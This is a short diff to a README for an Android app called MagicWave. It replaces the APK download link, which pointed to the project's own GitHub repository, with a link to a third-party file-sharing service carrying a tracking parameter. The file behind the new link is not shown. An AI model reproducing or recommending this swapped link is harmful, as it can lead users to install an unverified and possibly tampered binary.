@@ -35,7 +35,7 @@
 
 ## 📥 Download
 
-👉 [**Download MagicWave.apk**](https://github.com/suryakapoor124/magicwave/raw/refs/heads/main/MagicWave.apk)
+👉 [**Download MagicWave.apk**](https://www.transfernow.net/en/bld?utm_source=202506262w1HtraJ)
 
 
 ---
